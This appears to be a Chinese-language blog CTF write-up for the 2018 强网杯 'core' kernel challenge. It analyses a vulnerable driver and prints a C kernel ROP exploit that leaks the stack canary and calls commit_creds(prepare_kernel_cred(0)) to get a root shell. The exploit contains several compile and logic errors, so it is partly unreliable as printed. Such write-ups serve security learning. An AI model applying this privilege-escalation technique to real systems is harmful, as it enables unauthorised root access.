<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="John Doe">







<title>qwb2018 | Hexo</title>



    <link rel="icon" href="/favicon.ico">



<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&family=Roboto+Mono&display=swap');
</style>



    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    




    <!-- scripts list from _config.yml -->
    
    <script src="/js/menu.js"></script>
    










  <meta name="generator" content="Hexo 7.3.0"></head>
  <body>
    <div class="mask-border">
    </div>

    <div class="wrapper">

      <div class="header">
  <div class="flex-container">
    <div class="header-inner">
      <div class="site-brand-container">
        <a href="/">
          
            Frame.
          
        </a>
      </div>
      <div id="menu-btn" class="menu-btn" onclick="toggleMenu()">
        Menu
      </div>
      <nav class="site-nav">
        <ul class="menu-list">
          
            
              <li class="menu-item">
                <a href="/">Home</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/archives/">Archive</a>
              </li> 
                   
          
            
              <li class="menu-item">
                <a href="/categories/gallery/">Gallery</a>
              </li> 
                   
          
          
        </ul>
      </nav>
    </div>
  </div>
</div>
<script src="/js/menu.js"></script>


      <div class="main">
        <div class="flex-container">
          <article id="post">

  
    <div class="post-head">
    <div class="post-info">
        <div class="tag-list">
            
        </div>
        <div class="post-title">
            
            
                qwb2018
            
            
        </div>
        <span class="post-date">
            Sep 26, 2025
        </span>
    </div>
    <div class="post-img">
        
            <div class="h-line-primary"></div>
              
    </div>
</div>
    <div class="post-content">
    <h4 id="实例：强网杯2018-core"><a href="#实例：强网杯2018-core" class="headerlink" title="实例：强网杯2018-core"></a>实例：强网杯2018-core</h4><p>给了四个文件（bzImage,core.cpio,start.sh,vmlinux),vmlinux是bzImage压缩前的文件，pop段全，若题目没给vmlinux，通过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux </span><br><span class="line">file vmlinux</span><br></pre></td></tr></table></figure>

<p>先看start.sh:发现开启了kaslr，启动一下，若无法启动，将-m后的参数调大</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>再看看init文件：很好，将kallsyms保存到tmp目录，所以可以通过打开&#x2F;tmp&#x2F;kallsyms目录找commit_creds和prepare_kernel_cred。将kptr_restrict设为1，就不能通过&#x2F;proc&#x2F;kallsyms找地址，将dmesg_restrict设为1，不能用dmesg看kernel信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<p>接下来查看vmlinux：开启kaslr没关系，因为我们可以通过找到vmlinux-0x9c8e0从而获得vmlinux_addr,vmlinux_addr-0xffffffff81000000&#x3D;offset.这样就可以利用vmlinux文件中的pop段等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import*</span><br><span class="line">&gt;&gt;&gt; vmlinux=ELF(&quot;vmlinux&quot;)</span><br><span class="line">[*] &#x27;/home/voyager/qwb2018/vmlinux&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    Version:    4.15.8</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0xffffffff81000000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br><span class="line">&gt;&gt;&gt; hex(vmlinux.sym[&quot;commit_creds&quot;]-0xffffffff81000000)</span><br><span class="line">&#x27;0x9c8e0&#x27;</span><br></pre></td></tr></table></figure>

<p>将core.ko文件放入ida查看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">voyager@voyager-virtual-machine:~/qwb2018$ checksec core.ko</span><br><span class="line">[*] &#x27;/home/voyager/qwb2018/core.ko&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x0)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>

<p>先看core_ioctl:经典选择，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">int64 fastcall core_ioctl(int64 a1, int64 a2, __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  switch ( (_DWORD)a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    case 0x6677889B:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      break;</span><br><span class="line">    case 0x6677889C:</span><br><span class="line">      printk(&amp;unk_2CD, a3);</span><br><span class="line">      off = a3;</span><br><span class="line">      break;</span><br><span class="line">    case 0x6677889A:</span><br><span class="line">      printk(&amp;unk_2B3, a2);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      break;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0LL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>​	core_read就是可以将v6[off]的值给到某个地址，所以我们可以自己设个buf[40]，然后将内容读取到其中，又因为v6在rbp-0x50,所以我们在case 2中将off设为0x40，这样buf[0]就是canary，然后就是执行rop链了。</p>
<p>看core_write:将输入的内容输给&amp;name，case 3有个qmemcpy(v3, &amp;name, (unsigned __int16)a1);这样就可以造成溢出了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall core_write(__int64 a1, __int64 a2, unsigned __int64 a3)</span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215, a2);</span><br><span class="line">  if ( a3 &lt;= 0x800 &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    return (unsigned int)a3;</span><br><span class="line">  printk(&amp;unk_230, a2);</span><br><span class="line">  return 4294967282LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line">exp：</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/ioctl.h&gt;</span><br><span class="line">size_t vmlinux_commits,prepare_kernel_cred;</span><br><span class="line">size_t raw_vmlinux_addr=0xffffffff81000000;</span><br><span class="line">size_t user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line">void savestatus() &#123;</span><br><span class="line"> 	__asm__(</span><br><span class="line">  	&quot;mov user_cs, cs;&quot;</span><br><span class="line">  	&quot;mov user_ss, ss;&quot;</span><br><span class="line">  	&quot;mov user_sp, rsp;&quot;</span><br><span class="line">  	&quot;pushf;&quot;</span><br><span class="line">  	&quot;pop user_rflags;&quot;</span><br><span class="line"> 	);</span><br><span class="line">&#125;    //保存寄存器</span><br><span class="line">void getshell()</span><br><span class="line">&#123;</span><br><span class="line">	if(getuid())&#123;</span><br><span class="line">		system(&quot;/bin/sh&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		puts(&quot;error&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;	//getuid(),检验root，为0返回1</span><br><span class="line">int getaddress()</span><br><span class="line">&#123;</span><br><span class="line">	FILE *fd=open(&quot;/tmp/kallsyms&quot;,&#x27;r&#x27;);</span><br><span class="line">	char buf[0x50]=0;</span><br><span class="line">	char *ptr;</span><br><span class="line">	if(!fd)&#123;</span><br><span class="line">		puts(&quot;error&quot;);</span><br><span class="line">		return 0;</span><br><span class="line">	&#125;</span><br><span class="line">	while(fgets(buf,sizeof(buf),fd))&#123;</span><br><span class="line">		if(commit_creds&amp;&amp;prepare_kernel_cred)&#123;</span><br><span class="line">			printf(&quot;[+] Find: commit_creds: 0x%llx\n[+] Find: prepare_kernel_cred: 0x%llx\n&quot;, commit_creds, prepare_kernel_cred);</span><br><span class="line">			return 1;</span><br><span class="line">		&#125;</span><br><span class="line">		if(strstr(buf,&quot;commit_creds&quot;))&#123;</span><br><span class="line">			commit_creds=strtoull(buf,ptr,16);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strstr(buf,&quot;prepare_kernel_cred&quot;))&#123;</span><br><span class="line">			prepare_kernel_cred=strtoull(buf,ptr,16);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line">void main()&#123;</span><br><span class="line">	savestatus();</span><br><span class="line">	getadress();</span><br><span class="line">	vmlinux_base=commit_creds-0x9c8e0;</span><br><span class="line"> 	size_t offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"> 	size_t pop_rdi = 0xffffffff81679ba8 + offset;</span><br><span class="line"> 	size_t pop_rdx = 0xffffffff810a0f49 + offset;</span><br><span class="line"> 	size_t mov_rdi_rax = 0xffffffff8106a6d2 + offset; // mov rdi, rax; jmp rdx;</span><br><span class="line"> 	size_t swapgs = 0xffffffff81a012da + offset;  // swapgs; popfq; ret;</span><br><span class="line">	size_t iretq = 0xffffffff81050ac2 + offset;   // iretq; ret;</span><br><span class="line">	int fd=open(&quot;/pro/core&quot;,2);</span><br><span class="line">	if(!fd)&#123;</span><br><span class="line">		puts(&quot;error&quot;);</span><br><span class="line">		exit(0);</span><br><span class="line">	&#125;</span><br><span class="line">	ioctl(fd,0x6677889C,0x40);</span><br><span class="line">	char user_buf[0x40] = &#123;0&#125;;</span><br><span class="line">	ioctl(fd, 0x6677889B, user_buf);</span><br><span class="line">	size_t canary = ((size_t*)user_buf)[0];</span><br><span class="line">	printf(&quot;[+] Find canary: 0x%llx\n&quot;, canary);\</span><br><span class="line">	size_t rop[0x100];</span><br><span class="line">	int i=8;</span><br><span class="line">	rop[i++] = canary;</span><br><span class="line"> 	rop[i++] = 0;</span><br><span class="line"> 	rop[i++] = pop_rdi;</span><br><span class="line"> 	rop[i++] = 0;</span><br><span class="line">	rop[i++] = prepare_kernel_cred;</span><br><span class="line"> 	rop[i++] = pop_rdx;</span><br><span class="line"> 	rop[i++] = commit_creds;</span><br><span class="line"> 	rop[i++] = mov_rdi_rax;</span><br><span class="line"> 	//swapgs --&gt; iretq: rip, cs, rflags, rsp, ss. GetShell</span><br><span class="line"> 	rop[i++] = swapgs;</span><br><span class="line"> 	rop[i++] = 0;</span><br><span class="line"> 	rop[i++] = iretq;</span><br><span class="line"> 	rop[i++] = (size_t)getshell;</span><br><span class="line">	rop[i++] = user_cs;</span><br><span class="line">	rop[i++] = user_rflags;</span><br><span class="line">	rop[i++] = user_sp;</span><br><span class="line"> 	rop[i++] = user_ss;</span><br><span class="line">	write(fd,rop,sizeof(rop));</span><br><span class="line">	ioctl(fd,0x6677889A,0xffffffffffff0000|0x100);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>gcc exp.c -static -masm&#x3D;intel -g -o exp</p>

</div> 

<script>
    window.onload = detectors();
</script>
    <div class="post-footer">
    <div class="h-line-primary"></div>
    <nav class="post-nav">
        <div class="prev-item">
           
                <div class="icon arrow-left"></div>
                <div class="post-link">
                    <a href="/2025/09/26/kernel-basic/">Prev</a>
                </div>
            
        </div>
        <div class="next-item">
            
        </div>
    </nav>
</div>

    
      <div class="post-comment">

     

     
    
    

</div>
     
  
</article>
        </div>
      </div>
      
      <div class="footer">
    <div class="flex-container">
        <div class="footer-text">
            
            
            
                Powered by <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a target="_blank" rel="noopener" href="https://github.com/zoeingwingkei/frame/">Frame</a>
                
        </div>
    </div>
</div>

    </div>

    
    

  </body>
</html>
